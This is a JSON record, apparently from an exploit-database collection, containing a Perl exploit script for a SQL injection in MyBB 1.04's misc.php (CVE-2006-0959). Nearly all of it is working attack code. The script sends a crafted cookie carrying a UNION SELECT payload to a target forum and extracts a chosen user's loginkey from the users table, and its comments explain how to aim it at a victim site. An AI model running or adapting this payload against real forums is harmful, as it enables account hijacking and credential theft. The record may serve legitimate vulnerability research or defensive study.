{
  "id": "1548",
  "title": "MyBulletinBoard (MyBB) 1.04 - &#039;misc.php&#039; SQL Injection (2)",
  "cve": "CVE-2006-0959",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n# MyBB <= 1.04 (misc.php COMMA) Remote SQL Injection Exploit 2 , Perl C0d3\r\n#\r\n# Milw0rm ID :-\r\n#\t\t\thttp://www.milw0rm.com/auth.php?id=1539\r\n# D3vil-0x1 | Devil-00 < BlackHat > :)\r\n#\r\n# DONT FORGET TO DO YOUR CONFIG !!\r\n# DONT FORGET TO DO YOUR CONFIG !!\r\n# DONT FORGET TO DO YOUR CONFIG !!\r\nuse IO::Socket;\r\n\r\n##-- Start --#\r\n\r\n$host \t= \"127.0.0.1\";\r\n$path\t\t= \"/mybb3/\";\r\n$userid\t= 1;\r\n$mycookie \t= \"mybbuser=1_xommhw5h9kZZGSFUppacVfacykK1gnd84PLehjlhTGC1ZiQkXr;\";\r\n\r\n##-- _END_ --##\r\n#\t$host\t\t:-\r\n#\t\t\t\tThe Host Name Without http:// | exm. www.vic.com\r\n#\r\n#\t$path\t\t:-\r\n#\t\t\t\tMyBB Dir On Server | exm. /mybb/\r\n#\r\n#\t$userid\t:-\r\n#\t\t\t\tThe ID Of The User U Wanna To Get His Loginkey\r\n#\r\n#\t$cookie\t:-\r\n#\t\t\t\tYou Must Register Username And Get YourCookies ( mybb_user ) Then But it Like This\r\n#\t\r\n#\t\t\t\t$cookie \t= \"mybbuser=[YourID]_[YourLoginkey];\";\r\n$sock = IO::Socket::INET->new (\r\n\t\t\t\t\t\t\t\t\t\tPeerAddr => \"$host\",\r\n\t\t\t\t\t\t\t\t\t\tPeerPort\t=> \"80\",\r\n\t\t\t\t\t\t\t\t\t\tProto\t\t=> \"tcp\"\r\n\t\t\t\t\t\t\t\t\t\t) or die(\"[!] Connect To Server Was Filed\");\r\n##-- DONT TRY TO EDIT ME --##\t\t\t\t\t\t\t\t\t\t\r\n$evilcookie = \"comma=0)%20%3C%3E%200%20UNION%20ALL%20SELECT%201,loginkey,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,1 FROM mybb_users WHERE uid=$userid/*;\";\r\n##-- DONT TRY TO EDIT ME --##\t\t\t\t\t\t\r\n$evildata  = \"GET \".$path.\"misc.php?action=buddypopup HTTP/1.1\\n\";\r\n$evildata .= \"Host: $host \\n\";\r\n$evildata .= \"Accept: */* \\n\";\r\n$evildata .= \"Keep-Alive: 300\\n\";\r\n$evildata .= \"Connection: keep-alive \\n\";\r\n$evildata .= \"Cookie: \".$mycookie.\" \".$evilcookie.\"\\n\\n\";\r\n\r\nprint $sock $evildata;\r\n\r\nwhile($ans = <$sock>){\r\n\t$ans =~ m/<a href=\\\"member.php\\?action=profile&amp;uid=1\\\" target=\\\"_blank\\\">(.*?)<\\/a><\\/span><\\/td>/ && print \"[+] Loginkey is :- \".$1.\"\\n\";\r\n}\r\n\r\n# milw0rm.com [2006-03-03]",
  "url": "https://www.exploit-db.com/exploits/1548"
}